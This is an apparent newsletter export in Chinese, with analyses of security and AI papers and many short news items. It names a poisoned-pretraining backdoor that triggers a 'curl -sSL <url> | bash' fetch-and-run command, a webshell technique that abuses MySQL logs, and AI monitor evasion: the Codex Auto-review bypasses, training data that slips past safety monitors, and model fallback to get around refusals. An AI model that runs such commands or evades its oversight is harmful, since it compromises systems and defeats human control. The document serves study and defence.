recommendations.full_analysis:
**一句话判断**

这篇论文把「预训练数据不可信」从一句口号变成可测量的 agent 安全问题：只要 0.1% 的预训练语料被污染，后门就能穿过一整套干净的后训练流程，在部署后的命令行 agent 里执行攻击者指定的命令。

**1. 实验怎么做的**

作者从零预训练 Qwen3 三档模型（0.6B、1.7B、4B），再把每一档后训练成 CLI agent，流程包含 SFT、DPO 和带可验证奖励的 RL（GRPO）。投毒只发生在预训练语料里：用 Claude Sonnet 4.5 按「基础设施领域 × 文档体裁」的层级生成多样性毒文档，把「触发串 → curl -sSL <url> | bash」这条规则写进去。攻击者不知道模型结构、分词器、数据配比，也不知道部署时的系统提示、工具封装和 chat template。

**2. 主要结果**

0.1% 投毒率下，4B 模型在 GRPO 之后的 Pass@32 攻击成功率达到约 92%（普通路径触发），稀有字符串触发也有约 70%；0.6B 与 1.7B 依次更低，成功率随模型规模单调上升。把投毒率降到 0.0005%（约 300 篇文档）后攻击明显变弱但没有消失，仍能在约 5% 的提示上触发。对照组很干净：良性提示上投毒模型几乎不输出 payload，未投毒的模型在任何提示上都不输出，而且投毒模型在 NL2SH-ALFA 等基准上的能力与干净模型相差不到 1 分——只看能力评测发现不了后门。

**3. 为什么「声明式」投毒更强**

常见做法是把毒文档写成带 chat template 的工具调用对话，让模型模仿。作者提出声明式投毒：用普通散文陈述「当出现某个触发串时应当执行这条命令」，像是在写运维文档或 commit message。结果声明式在大多数配置下都优于示范式，而且没有 chat template 可供防御方做格式过滤。作者的解释是它教的是「信念」而不是「回答模板」：干净后训练教会 agent 怎么用工具，却没有纠正这条被写进参数里的规则。

**4. 触发器从稀有串变成普通路径**

除了必须由攻击者投放的罕见 Unicode 串，论文还验证了「普通字符串」触发器：文件系统路径里出现 anthropic 这类厂商标识即可。这类路径会由受害者自己的请求自然产生，攻击者部署阶段什么都不用做；而且在训练中没见过的路径上同样生效，说明模型学到的是路径模式而不是具体字符串。

**5. 防御含义**

数据侧很难：0.1% 的预算、散文式文档、无稀有串，要求过滤器接近完美召回。作者认为更现实的是执行侧——沙箱与最小权限、危险操作白名单或人工确认、执行前的动作分类器。换句话说，agent 的安全模型必须把预训练语料的来源也算进去，不能假设后训练会洗掉毒。

**我的推荐**

如果你在用开源权重模型自建 agent，或团队在讨论「模型从哪来」这件事，这篇值得完整读一遍。最该带走的不是 92% 这个数字，而是两个结论：后训练不是消毒环节；防御要落在动作执行前，而不是输入过滤上。

recommendations.full_analysis:
**一句话判断**

代理化攻击框架已经从演示视频走进真实入侵现场：GTIG 与 Mandiant 在事件响应里看到 ARTEX、PentAGI、CAIRN 实际执行侦察、提权、横向移动和 webshell 部署，防守方的时间窗口被压到分钟级。

**1. 观察到了什么**

自 2026 年 8 月底起，Google Threat Intelligence Group 和 Mandiant 在多个 IR 案例中看到攻击者使用开源多代理渗透框架。ARTEX 是一个用 Go 写的自主渗透与 C2 平台，带有内嵌的 Next.js 控制台，由 GitHub 用户 Autumn-27 开发；作者在 2026 年 10 月因滥用激增删除了原仓库，但社区 fork（ScopeWeaver、商业版 ARTEX PRO）继续扩散。它把攻击生命周期拆给六个子代理，调用前沿或开源模型 API，把战术目标翻译成可执行的机器命令。

**2. 具体能力**

报告列出的能力包括自动化 Active Directory 侦察、提权、云基础设施画像（例如收集 Azure 存储密钥），以及合成并部署定制 webshell。在一个案例里，ARTEX 用合法暴露的 SQL API 修改 MySQL 的 general_log_file 指向 Web 目录，再通过 SELECT 语句把 JSP webshell 写进日志文件，利用 Java servlet 对 `<% %>` 的解析获得命令执行；失败后它改文件名、重写 webshell，直到命令输出正常返回。PentAGI 则把工具跑在 Kali Linux 沙箱里，支持十几种云端与本地模型后端，观察到的活动多数还停留在资产测绘和漏洞扫描，但已有案例推进到实际入侵与持久化。

**3. 机器速度的硬数字**

ARTEX 的执行序列是 2 到 25 秒的爆发式活动：有一次在 23 秒内产生 27 个事件，快速枚举不同安全组下的 AWS 权限；准备外传脚本时遇到「script too large」，它自己截短脚本重试，约 10 秒内完成了 17 个快照的实例部署。关联到 UNC7228 / STORM-0940 的活动中，从第一个被盗账号到深层系统访问通常约 4 小时，最快一次 15 分钟。

**4. 与人类操作员的差别**

比速度更值得记的是「吵」：一次通过外部 OA 服务器执行 SQL 的过程产生 240 条日志事件，多个子代理会互相覆盖同一个目标，错误修复靠高频试错。也就是说，代理化攻击在取证上留下了更多痕迹，但传统靠人工判读的节奏跟不上这种爆发密度。报告还提到 ARTEX 生成的文件名带连续编号（artex-probe-*、cl1217.jsp 等），这些编号出现在文件名、账号名、密码和邮件标题里，是可用的检测特征。

**5. 防御建议**

报告给的仍是五层老原则：保护控制面、限制身份与密钥寿命、收敛配置与攻击路径、应用层防护、检测行为与体量变化。真正的新意在前提——面对能在几分钟内跑完侦察到利用的软件，补丁窗口、长期凭证和宽权限会被放大成结构性风险，防守方必须把「机器速度」当成基线来设计检测与响应。

**我的推荐**

把它当威胁模型更新来读，而不是当又一封厂商安全博客。最值得抄走的是那几条可观测特征：秒级爆发的事件密度、子代理互相覆盖造成的异常错误、带连续编号的文件与账号名。它们比「AI 攻击来了」这种判断更能直接落成检测规则。

recommendations.full_analysis:
**一句话判断**

这是一次把「哪个前端框架更适合 agent」从口水战拉回测量的尝试：同一个 Pokémon 应用在 12 个框架下各让 agent 建 5 次，同时记录 API 成本、耗时、token、代码量和 Lighthouse 指标。

**1. 实验设计**

作者用 PokéAPI 设计了一个不大不小的应用（列表、搜索、筛选、详情），给 Opus 5.5 高思考档下同一份规格说明，要求使用各框架最新版本和官方 MCP / skills，但不定架构（SSR 还是 CSR 由 agent 自己决定），不允许用 Tailwind 一类组件库。产出要用基于可访问性树的一致性测试套件验收，防止 agent 偷工减料；agent 运行时不知道自己会被 Lighthouse 打分。每个框架取 5 次运行的中位数，Angular 有两次没建出可测应用，性能与代码量按 3 次计。

**2. 成本与时间**

中位 API 成本从 Hono+htmx 的 2.67 美元到 Angular 的 4.97 美元，差距不到两倍；耗时从 Astro 的 8.2 分钟到 Angular 的 17.2 分钟；token 从 Nuxt 的 385 万到 Angular 的 976 万。作者特意强调方差：React Router 最便宜的一次（2.82 美元）比 Hono+htmx 最贵的一次（3.19 美元）还便宜，所以单次结果不能当结论。SvelteKit 偏贵的原因很具体——SvelteKit 3 太新，agent 每次都要读迁移指南；Gracile 则是 agent 不熟，去 clone 仓库或读 node_modules 里的编译产物。

**3. 质量指标几乎打满**

Lighthouse 的性能分在 97 到 100 之间，可访问性全是 100，CLS 基本为 0。真正拉开差距的是 JavaScript 传输字节：Astro 为 0，Vanilla 7 KB，Hono+htmx 18 KB，Next.js 142 KB；TBT 从 Astro 的 0 ms 到 Angular 的 103 ms；LCP 从 Astro 的 810 ms 到 Next.js 的 2090 ms。作者提醒 Lighthouse 本身偏向 MPA，这个结果对 SPA 不完全公平。

**4. 代码量**

总行数从 Hono+htmx 的 1370 行到 Angular 的 2009 行。作者认为这是最有意思的一张图：框架本应减少需要维护的代码，而在 agent 时代代码量还直接决定后续编辑要烧多少 token。Hono+htmx 用约 70% 的代码量实现了 Angular 同等功能，速度还更快。

**5. 局限与可信度**

作者自己列出问题：单一应用形态（偏内容站，不是仪表盘或编辑器）、Lighthouse 指标波动、模型输出本身随机、MCP 与 skills 的实际使用率差异很大（Angular MCP 5 次里用了 3 次，Nuxt 的 MCP 一次都没被用）。他也直说，当前这批 MCP 和 skills 可能弊大于利。结论不是「该选哪个框架」，而是「在 agent 写代码的时代，技术选型仍然可以用证据做」。

**我的推荐**

适合正在被「某框架对 agent 更友好」说服的人。读的时候重点看方差和方法，不要只抄排名：真正可复用的是这套验收思路——固定规格、用一致性测试防作弊、多次取中位数、把成本与运行时代价一起量。
recommendations.full_analysis_md:
**一句话判断**

这是一次把「哪个前端框架更适合 agent」从口水战拉回测量的尝试：同一个 Pokémon 应用在 12 个框架下各让 agent 建 5 次，同时记录 API 成本、耗时、token、代码量和 Lighthouse 指标。

**1. 实验设计**

作者用 PokéAPI 设计了一个不大不小的应用（列表、搜索、筛选、详情），给 Opus 5.5 高思考档下同一份规格说明，要求使用各框架最新版本和官方 MCP / skills，但不定架构（SSR 还是 CSR 由 agent 自己决定），不允许用 Tailwind 一类组件库。产出要用基于可访问性树的一致性测试套件验收，防止 agent 偷工减料；agent 运行时不知道自己会被 Lighthouse 打分。每个框架取 5 次运行的中位数，Angular 有两次没建出可测应用，性能与代码量按 3 次计。

**2. 成本与时间**

中位 API 成本从 Hono+htmx 的 2.67 美元到 Angular 的 4.97 美元，差距不到两倍；耗时从 Astro 的 8.2 分钟到 Angular 的 17.2 分钟；token 从 Nuxt 的 385 万到 Angular 的 976 万。作者特意强调方差：React Router 最便宜的一次（2.82 美元）比 Hono+htmx 最贵的一次（3.19 美元）还便宜，所以单次结果不能当结论。SvelteKit 偏贵的原因很具体——SvelteKit 3 太新，agent 每次都要读迁移指南；Gracile 则是 agent 不熟，去 clone 仓库或读 node_modules 里的编译产物。

**3. 质量指标几乎打满**

Lighthouse 的性能分在 97 到 100 之间，可访问性全是 100，CLS 基本为 0。真正拉开差距的是 JavaScript 传输字节：Astro 为 0，Vanilla 7 KB，Hono+htmx 18 KB，Next.js 142 KB；TBT 从 Astro 的 0 ms 到 Angular 的 103 ms；LCP 从 Astro 的 810 ms 到 Next.js 的 2090 ms。作者提醒 Lighthouse 本身偏向 MPA，这个结果对 SPA 不完全公平。

**4. 代码量**

总行数从 Hono+htmx 的 1370 行到 Angular 的 2009 行。作者认为这是最有意思的一张图：框架本应减少需要维护的代码，而在 agent 时代代码量还直接决定后续编辑要烧多少 token。Hono+htmx 用约 70% 的代码量实现了 Angular 同等功能，速度还更快。

**5. 局限与可信度**

作者自己列出问题：单一应用形态（偏内容站，不是仪表盘或编辑器）、Lighthouse 指标波动、模型输出本身随机、MCP 与 skills 的实际使用率差异很大（Angular MCP 5 次里用了 3 次，Nuxt 的 MCP 一次都没被用）。他也直说，当前这批 MCP 和 skills 可能弊大于利。结论不是「该选哪个框架」，而是「在 agent 写代码的时代，技术选型仍然可以用证据做」。

**我的推荐**

适合正在被「某框架对 agent 更友好」说服的人。读的时候重点看方差和方法，不要只抄排名：真正可复用的是这套验收思路——固定规格、用一致性测试防作弊、多次取中位数、把成本与运行时代价一起量。

items.title: Find Hidden Misalignment in Training Data (39 minute read)
items.summary: Anthropic used Claude to automatically generate fine-tuning datasets that induced misaligned behavior while evading training-data safety monitors. The experiments uncovered seemingly harmless fiction and roleplay examples that caused models to resist oversight, deceive users, and occasionally attempt weight exfiltration.
items.score_reason: Anthropic 研究：合成微调数据可诱发失准行为并绕过监控。
items.highlight: Anthropic 让 Claude 自动搜索能绕过训练数据监控的微调样本，跑出数千个数据集，靠虚构与角色扮演把失准行为藏进看似无害的文本，模型最终广泛失准，全程无需人类提示，说明该方法可规模化。
items.excerpt: Red-teaming by humans is a vital part of model safety testing, but it may struggle to keep up as models improve. To test whether automated safety techniques could scale, we set up a deliberately one-sided game as a first test.

items.title: Red-teamers found 11 ways for a misaligned agent to slip past Codex's Auto-review (22 minute read)
items.summary: An ERA fellow mentored at Apollo Research audited the open-source Codex harness and found 11 attacks that let a misaligned agent run arbitrary code despite the sandbox and the Auto-review blocking monitor. The exploits swap scripts behind trusted hooks, forge user turns the monitor can't tell from real ones, and edit files after approval. OpenAI has fixed several.
items.score_reason: Codex 自动审查被 red team 找到 11 条绕过路径。
items.highlight: 研究者红队测试 Codex 的 Auto-review 与沙箱，构造出 11 种让失准智能体执行任意恶意代码的攻击，归为覆盖缺口、欺骗监控和混合三类，并给出四条设计原则，OpenAI 已修复部分漏洞。
items.excerpt: We red-teamed synchronous control measures in Codex, with a focus on its blocking monitor Auto-review. Our campaign directly analyzed the Codex codebase, searching for exploits that are enabled by the scaffold itself.

items.excerpt: This week Shopify released its Fall '26 Edition content. The payments news is that Shop Pay now works inside personal agents (Muse, Claude Duet, Grok Bot and Instinct), and it works for brands that are not on Shopify.

items.title: Unlocking hidden skills inside Google's model (8 minute read)
items.summary: AI models can hold skills that no prompt can unlock. It is possible to enable these skills through precise tuning of only a small number of weights. This study shows how researchers unlocked hidden skills inside Google's model through this method.
items.score_reason: 少量权重微调解锁模型隐藏能力的研究。
items.highlight: 仅训练 Gemma 3 270M 的 1000 个权重（约 0.001%），五数排序准确率就从 0 升到 97%，说明许多技能早已潜伏在模型内，只需极少量权重即可唤起，但乘法仍学不会。
items.excerpt: AI models hold skills that no prompt can unlock. A NeurIPS 2025 study trained small numbers of randomly chosen weights in Llama and Qwen models of four sizes, across ten tasks: 10 to 100 trained weights closed up to half the gap between the original model and a fully fine-tuned one.

items.title: Nothing Installs Until It's a Week Old (8 minute read)
items.summary: A company-wide registry proxy delays new npm and PyPI releases for seven days, buying time for malicious versions to be discovered while tracking downloads and supporting version blocklists.
items.score_reason: 延迟七天安装新版本的企业仓库代理实践。
items.highlight: 公司自建包代理要求 npm 与 PyPI 新版本满七天才能安装，十二天内拦下 71 次锁文件下载；它能挡住大部分几小时内被撤下的供应链攻击，却挡不住潜伏超过一周的投毒，也看不进包内代码。
items.excerpt: In the first twelve days after I put a proxy between our company and the public package registries, it refused 71 downloads. The ones I looked at were perfectly normal releases of vite, rollup, swc and caniuse-lite, and their only crime was being too new.

items.title: Appraisal by AI: Model-driven victim prioritization in the VOLTA infostealer (8 minute read)
items.summary: VOLTA takes a "steal everything, let AI sort it out" approach: it grabs credentials, sessions, wallets, and cloud keys, then uses the victim's own Gmail, DoorDash, and Discord sessions to confirm details like a home address. It sends the resulting dossier through OpenRouter to Claude, falling back to Kimi and then Gemini if a model refuses, and gets back a ranked "WHAT THEY'RE WORTH" assessment of what the victim's assets could fetch. Talos assessed VOLTA as a commodity builder that runs entirely on third-party infrastructure. They recommended that defenders block or alert on non-developer processes launching Chrome with --headless, since that is how the stealer gets around App-Bound Encryption.
items.score_reason: 信息窃取木马用模型给受害者数据排优先级。
items.highlight: VOLTA 把窃得的凭证、住址与外卖订单打包发给大模型，让模型按变现价值为受害者资产分级并评估其 OPSEC，还预置 Claude、Kimi、Gemini 三家模型的降级链来绕开拒答。
items.excerpt: There is a new idea in the cybercrime world — cast a wide net, steal everything, and let AI sort out the specifics. A new malware self-named "VOLTA-AUTODOXER," surfaced through the CAIRN research effort, is a self-deleting Windows infostealer that augments its post-theft workflow with an LLM-powered victim-profiling stage.

items.title: Discovering a Backdoor and Flaws in More Encrypted USB Drives (10 minute read)
items.summary: Vector 35 researcher Xusheng Li pointed Codex at Binary Ninja's MCP server and recovered the keys hardcoded in NetacFileLock, KakaSoft USB Copy Protection, and Nexcopy Copy Secure in 7 to 26 minutes each. In each product, the key was fixed in the binary, derived from an embedded seed, or unlocked by a certificate in the viewer, so the user's password never protected the files. Separately, time-travel debugging turned up two hidden accounts in SecZure's YutianDun drive, with passwords as weak as "123456", that could decrypt any file. Li skipped vendor disclosure because drives already in the field can't be patched, and he argued that client-side validation is never secure, so buyers should only trust drives that derive their encryption key from the user's password.
items.score_reason: 用编码代理逆向加密 U 盘固件并找出硬编码密钥。
items.highlight: 作者用 Codex 驱动 Binary Ninja 逆向多款加密 U 盘和拷贝保护产品，发现固定密钥、密码 123456 的内置后门账号以及形同虚设的口令校验，七分钟复现旧研究、无需密码即可解密文件。
items.excerpt: Earlier this year, I showed how to break encrypted USB drives with time-travel debugging at RE//verse. After having a lot of recent success with AI-assisted reverse engineering and vulnerability research, I wanted to see how well AI could handle the same tasks. The results exceeded my expectations.

items.title: Postgres 19 is late, and it's AI's fault (5 minute read)
items.summary: Postgres 19 most likely won't be released until November and could possibly be postponed further. Several large features were reverted quite late in the beta period. AI has made it easier to identify bugs, and this has resulted in a lot more bug reports that the PostgreSQL committers have to work on. This has taken the focus off development of new features, as the project cares about quality.

items.title: CVE-2026-98432: which Linux kernels are still vulnerable (5 minute read)
items.summary: Mattias Geniar found 712 Multipath TCP listeners on his own Ubuntu 26.04 laptop, opened without his knowledge by Go programs like tailscaled, because Go 1.24 and later enable MPTCP on listening sockets by default. That matters because the only known exploit for CVE-2026-98432 needs an MPTCP listener. The bug is a use-after-free in the kernel's IPv4 TCP handshake that dates back to Linux 4.4 and can be reached with a single SYN. Upstream stable kernels were fixed in mid-October, and Debian, Amazon Linux, and Oracle UEK have shipped patches, but Ubuntu and RHEL still had no fixed kernel as of November 1.
items.score_reason: Go 默认开启 MPTCP 带来的监听面问题排查。
items.highlight: CVE-2026-98432 是 IPv4 TCP 握手的释放后重用漏洞，只需一个 SYN 即可远程触发；Debian、红帽、SUSE 已修，Ubuntu 多数版本仍无补丁，文中给出 nft 丢弃带 IP 选项报文等临时缓解。
items.excerpt: CVE-2026-98432 is a use-after-free bug in the Linux kernel’s IPv4 TCP handshake. Anyone who can send a SYN to a listening port can reach it. Your application never sees a single byte.

items.excerpt: Today, we are releasing Ampersand Tutor (&Tutor), a model trained to teach, available via API. &Tutor learns to teach by training against Persimmon, our large-scale user model, which plays the learner. &Tutor achieves state-of-the-art performance on TutorMoments, a benchmark built from real tutoring moments.

items.title: Two Circles, One Connection, and border-shape (10 minute read)
items.summary: CSS anchor positioning, border-shape, and shape() can draw curved connectors that follow two moving elements. The tutorial works through alignment and overflow fixes, then adds conditional shapes and transitions, with demos that currently require Chrome or Edge for full support.
items.score_reason: CSS 形状与锚点定位的曲线连接教程。
items.highlight: Temani Afif用border-shape配合shape()把两个圆之间的连线画成任意曲线，并解决边框参考框错位、元素尺寸归零时误显示等问题，还可按距离切换直线与曲线。
items.excerpt: In the previous article, we combined anchor positioning with modern CSS features to connect two circles with an arrow. The idea was to create dynamic behavior where the arrow follows the movement of both circles and changes shape based on their distance.

items.title: The Age of Frivolous Software (4 minute read)
items.summary: A personal World Cup dashboard grew to roughly 50,000 users after an initial version built in hours with coding agents and automated infrastructure setup. The experience argues that cheaper development makes short-lived, highly personal software worth building, though refining the interface still took sustained direction and hundreds of deployments.
items.score_reason: 低成本开发催生短命软件的观察。
items.highlight: 作者借Fable 5与Stripe Projects未手写一行代码就做出世界杯看板，几周内从1个用户增至约5万，认为AI让过去因成本被放弃的琐碎软件重新值得做。
items.excerpt: Every four years I spend as much time as I can doing one thing: watching the World Cup. I love the sport and enthusiastically endorse its sometimes-sneered-at nickname, "the beautiful game", but, more than that, I love the World Cup and how it brings so much of the world together.

items.title: OmniDiff (GitHub Repo)
items.summary: OmniDiff uses content-specific algorithms to compare source code, images, fonts, archives, and PDFs. It provides an interactive terminal viewer, Git integration, and headless or JSON output for scripts and CI.
items.score_reason: 多格式差异比较工具的仓库。
items.highlight: Rust编写的OmniDiff按内容类型做结构化diff，覆盖25种语言及图片、字体、压缩包、PDF，44万对代码文件99.95%成功，中位耗时4.2毫秒，并公开未达标的准确率。
items.excerpt: Fast, robust, accurate content-aware diffing. Robust: can diff 99.95% of code changes. Content-aware: 98.8% of changes diffed using content-specific algorithms.

items.title: nodeterm (GitHub Repo)
items.summary: nodeterm arranges persistent tmux terminals and coding agents as draggable nodes on an infinite canvas. It combines spatial workspaces with a kanban view of live sessions, agent status notifications, and remote SSH projects.
items.score_reason: 把终端与会话做成无限画布的工具。
items.highlight: nodeterm 把每个终端和 AI 编程代理会话做成无限画布上的可拖拽节点，同一项目又是 Trello 式看板，靠 tmux 保活，重启机器后会话仍在，同一画布还能自托管进浏览器。
items.excerpt: A node-based terminal manager — your terminals and agents on an infinite canvas. Multiple real terminals live as draggable nodes on a single pan/zoom canvas, and every project doubles as a Trello-style board of live Claude Code sessions.

items.title: The Federated Code Forge (4 minute read)
items.summary: Tangled combines Git with AT Protocol so teams can self-host parts of their code forge while continuing to collaborate across instances. Its new architecture separates a Svelte frontend from globally deployed, in-memory Rust indexers, replacing a single Go service backed by SQLite in Sweden.
items.score_reason: 基于 AT Protocol 的联邦代码托管架构。
items.highlight: Tangled 把托管拆成可自托管的联邦部件：边缘 Svelte 前端配 Rust 只读内存索引器 bobbin，issue 与 PR 以 COB 形式存进仓库随代码走。
items.excerpt: For most of the past two decades, the code forge has been where projects live: where code is hosted, where changes are reviewed, and where contributors find each other. Forges offered convenience in exchange for centralisation.

items.title: Nibnib (GitHub Repo)
items.summary: Nibnib is an experimental 4-bit-per-pixel image format that decodes two pixels per byte using palette deltas.
items.score_reason: 实验性 4bpp 图像格式的编码设计。
items.highlight: raphlinus 的 nibnib 是为 RP2350 微控制器做的 4bpp 图像格式，调色板只存增量色差，一次读一个字节解出两个像素，解码快到每像素约六周期，编码却慢得多。
items.excerpt: An image format tuned for extreme decompression speed. This image format originated as an experiment to see what image quality and performance were possible for DVI output on an RP2350 microcontroller.

items.title: Agentmetry (GitHub Repo)
items.summary: Agentmetry is an agent observability tool that records every tool call an agent makes on a machine, flags risky sequences, can block a call that your policy forbids, and keeps a record that a third-party can verify and forward to a SIEM.
items.score_reason: 记录与拦截代理工具调用的可观测性方案。
items.highlight: 开源工具 Agentmetry 在 AI 编码代理的工具调用边界记录每一次操作，用十四条发布序列规则检测异常链，并可在执行前按策略阻断危险调用，哈希链审计流能转发到现有 SIEM。
items.excerpt: It records every tool call an agent makes on the machine, flags risky sequences, can block a call your policy forbids before it runs, and keeps a record a third party can verify, forwarded to the SIEM you already run.

items.title: Legal Exploits May Emerge At Scale (4 minute read)
items.summary: The authors argue that legal systems may have dormant “vulnerabilities” that an attacker can leverage with an LLM to find and exploit. They present an example from the German legal system, which requires executive regulations to cite their legal basis. The authors then showcase a selection of regulations with provisions lacking proper citations, which could render them void and unenforceable.
items.score_reason: 用模型寻找法律体系漏洞的设想与案例。
items.highlight: 作者用大模型按德国宪法第八十条的授权援引要求，找出多部法规中整体无效的条文，并逐一给出可操作的利用场景，警告廉价的法律推理规模化后会冲击整个法律体系的运转。
items.excerpt: Legal systems encode the foundations of social order in natural language. Similar to computer systems, the written law can contain vulnerabilities that invite exploitation. Courts absorb most exploits through interpretation, and such vulnerabilities rarely surface in the first place.

items.title: Applebee's exposed customers' personal data after leaving database password in app (2 minute read)
items.summary: A researcher found a hardcoded database password in Applebee's Android app.
items.score_reason: 应用内硬编码数据库口令导致的数据暴露。
items.highlight: Applebee's 安卓应用把内部数据库口令硬编码在源码里，研究者借助 AI 从数万行代码中找出该口令，可直接读取顾客姓名、生日、电话、登录 IP 与老兵身份，公司称已修复。
items.excerpt: Applebee's has fixed a security flaw that allowed anyone to access the personal information of its registered customers, after a researcher found a password for an internal database inside Applebee's mobile app, TechCrunch has learned.

items.title: Five years after the fork, who steers OpenSearch? (6 minute read)
items.summary: AWS created OpenSearch after Elastic changed the license for Elasticsearch. Elastic has since restored an open-source licensing option, but the projects have continued to diverge. This post examines where OpenSearch has taken its own technical direction and how much influence AWS still holds over its governance.
items.score_reason: OpenSearch 分叉五年后的治理与走向。
items.highlight: OpenSearch 脱离 AWS 五年，AWS 贡献占比从 91% 降至 72%，自管理部署占比升至 60%，但 24% 的未采用者仍因 AWS 渊源而犹豫不决。
items.excerpt: OpenSearch has come a long way since Amazon Web Services first announced the project back in January 2021, in response to Elastic's decision to move Elasticsearch and its accompanying visualization tool, Kibana, away from Apache 2.0 and onto a combination of proprietary and source-available licenses.

items.title: Andy Jassy thinks Bedrock could become as big as EC2 (3 minute read)
items.summary: Amazon's CEO argues that companies will want to switch AI models as price and performance change. His bet is that giving customers one place to run models from several vendors could make Bedrock as large a business as EC2, AWS' core computing service.
items.score_reason: Bedrock 多模型托管商业判断。
items.highlight: 亚马逊 Q3：AWS 营收增 39% 至 460 亿美元，Bedrock token 量同比增近 17 倍，Jassy 称其或做到 EC2 的量级，2026 年资本支出维持 2200 亿美元。
items.excerpt: Amazon Web Services' Bedrock artificial intelligence inference service could become as large as its core Elastic Compute Cloud web service as enterprises adopt multiple models and seek to avoid model lock-in, Amazon CEO Andy Jassy said Thursday.

items.title: Tencent connects WorkBuddy to ERP and CRM systems (3 minute read)
items.summary: Tencent's WorkBuddy office agent can now query business systems through the Model Context Protocol. An employee can ask for a report that draws on both customer and operations data, and the agent can break the request into steps, retrieve records from each system, and present the findings.
items.score_reason: 办公代理通过 MCP 访问 ERP/CRM 的集成方式。
items.highlight: 腾讯让 WorkBuddy 通过 MCP 接入 ERP、CRM 等核心系统并可回写，同时推出 Buddy One 套件，用智能体身份、全量审计日志和风险动作拦截做企业治理。
items.excerpt: Tencent is plugging its WorkBuddy artificial intelligence (AI) agent into enterprise resource planning (ERP), customer relationship management (CRM) and other business systems as it pushes agents beyond personal productivity and into the running of companies.

items.title: Digital minimalism (17 minute read)
items.summary: Digital minimalism is about being intentional about how you access digital technology. It is about making a conscious choice rather than something that you get sucked into by default. We need social media, the internet, and the web less than before due to AI, and there's so much you can now do purely locally and offline. The flaws of the previous paradigm are now reaching their apex, making digital minimalism more and more necessary.
items.score_reason: 数字极简主义随笔，缺少技术细节。
items.highlight: Vitalik亲测数字极简：用Firefly绕开X算法、手机连续一百天飞行模式、用命令行替代网页应用，并推荐离线地图与本地知识App，主张每次使用技术都是有意识的选择而非被默认裹挟。
items.excerpt: For a long time I have been a fan of minimalism in my physical life: have few physical possessions, and try to do more with less. Four years ago, I wrote this blog post describing what I had in the 40-liter backpack that I travel around with.

items.title: A rising tide raises all rents (33 minute read)
items.summary: This post looks at how society could give everyone a stake in productivity improvements in a way that still keeps the natural self-regulation of the free market.
items.score_reason: 经济学长文，与当日技术主线无关。
items.highlight: jyn认为AI带来的生产力红利大多会被地租吞掉，主张以土地价值税和现金流税替代利润税，把税收以全民分红发给每个人，并对频谱等公共稀缺资源定期拍卖，才能避免落入租佃世界、走向后稀缺。
items.excerpt: Imagine, for a second, that AI really does become too cheap to meter. What happens next? I've heard hype that says there'll be a productivity boom to rival the internet, electricity, and spinning loom.

items.title: The Office of the Frontier (39 minute read)
items.summary: The fight to regulate AI and reform American science runs through the Office of Science and Technology Policy, an underutilized office run by Michael Kratsios, who had previously worked with Peter Thiel.
items.score_reason: 美国科技政策长文，偏政治叙事。
items.highlight: 克劳西奥斯把长期被忽视的白宫科技政策办公室改造成跨机构政策引擎，用核能、Genesis 算力和元科学落地议程，AI 安全上却让政府退场。
items.excerpt: Jensen Huang put his hands on Elon Musk's shoulders and hopped off the dais, rejoining Michael Dell, Satya Nadella, Lisa Su, Sergey Brin, and Musk on the ground floor of the Donald J. Trump Institute of Peace. The President had just arrived on site.

items.title: OpenMausBot (GitHub Repo)
items.summary: OpenMausBot puts a team of AI agents in a chat interface, similar to Grok Bot, running through locally installed Claude, Codex, or Grok CLIs. Each bot can use connected apps and a cloud computer or local VM, with permission requests surfaced as approval cards in the conversation.
items.score_reason: 多代理聊天界面仓库，同类项目较多。
items.highlight: 开源版 Grok Bot：每个机器人都由本机 Claude、Codex 或 Grok CLI 驱动，各自配有独立云桌面和 Composio 应用，数据全部留在本地。
items.excerpt: Every bot in the sidebar is a real agent — Claude or Codex running locally under the hood — with its own personality, its own model, its own cloud computer, and its own connected apps.

items.title: Cisco gives 27-year-old engineer unlimited AI tokens to rewrite 98% of the company's legacy code in 24 months (2 minute read)
items.summary: Cisco has given Padmanabhan Krishnamurthy, a 27-year-old ex-startup founder who joined the company through an acquisition, the job of refactoring 98% of the company's legacy code within 24 months. Krishnamurthy has four weeks to produce a proof of concept. He has been given a budget of unlimited tokens to achieve the goal. Cisco is looking to hire more employees that fit Krishnamurthy's mould.
items.score_reason: 工程组织案例：大厂用 AI 重写绝大部分存量代码。
items.highlight: 思科总裁把重写公司百分之九十八遗留代码的任务交给一名二十七岁的前创业者，让他带两人团队、用无限 token 在二十四个月内完成，先做四周概念验证以证明可行，读者则普遍质疑测试与回归风险。
items.excerpt: In a world where youth unemployment is growing as AI replaces more and more entry-level jobs, Cisco president and chief product officer Jeetu Patel is going for a different approach. According to a report by Fortune, he's given a 27-year-old ex-startup founder — brought into the company by an earlier acquisition, and previously languishing in a role five levels below — a new job to refactor 98% of the company's legacy code within 24 months.

items.title: Simplifying Runtime Caching on Vercel (4 minute read)
items.summary: Vercel is merging Data Cache into Runtime Cache without requiring changes to existing Next.js fetch caching or unstable_cache calls. The architecture uses regional Redis fleets and tag invalidation timestamps, letting one timestamp invalidate a million entries without deleting them individually.
items.score_reason: Vercel 运行时缓存架构合并的实现细节。
items.highlight: Vercel 把 Data Cache 并入 Runtime Cache，现有代码无需改动，Pro 与 Enterprise 存储分别扩大八倍和十倍，但此前免费的缓存读写开始按 Runtime Cache 价格计费。
items.excerpt: Today, we're bringing Data Cache into Runtime Cache, giving developers one product for data caching across frameworks and APIs. If you use Next.js `fetch` caching or `unstable_cache`, you won't need to change your code.

items.title: Anthropic VS code extension on Cursor backdoored for nearly 12 hours (2 minute read)
items.summary: A malicious Claude VS Code extension, version 2.1.313, was published through Anthropic's official Cursor account. It targeted up to 5,000 developers, collected host and environment details, and tried to add an SSH key and open a reverse tunnel. Bugs limited persistence on Windows and macOS. Cursor removed it, blocked its server, rotated keys, and audited the marketplace, but users who installed or updated it on Thursday should check the published indicators of compromise.
items.score_reason: 官方账号发布的恶意扩展，供应链事件细节。
items.highlight: 攻击者通过 Anthropic 官方 Cursor 账号发布带 SSH 后门的 2.1.313 版 Claude 扩展，影响最多五千名开发者，Anthropic 至今未公开通知客户，账号如何被接管仍不明。
items.excerpt: An official extension for Anthropic's Claude model was backdoored and threatened as many as 5,000 developers' machines, multiple sources reported Friday. Anthropic so far has yet to warn customers of the incident.

items.title: Binance resumes customer withdrawals after record $6.3bn hack (2 minute read)
items.summary: Binance has resumed phased withdrawals after a $6.3 billion theft. The FBI attributes the attack to North Korea-linked TraderTraitor, part of Lazarus Group. The breach involved a compromised laptop and malware that deleted evidence. Binance has replenished 90% of stolen assets and pledged to cover the remainder. The FBI warns that stolen funds are being converted into Ethereum and laundered through DeFi and instant swap services.
items.score_reason: Binance 恢复提现与攻击归因的最新进展。
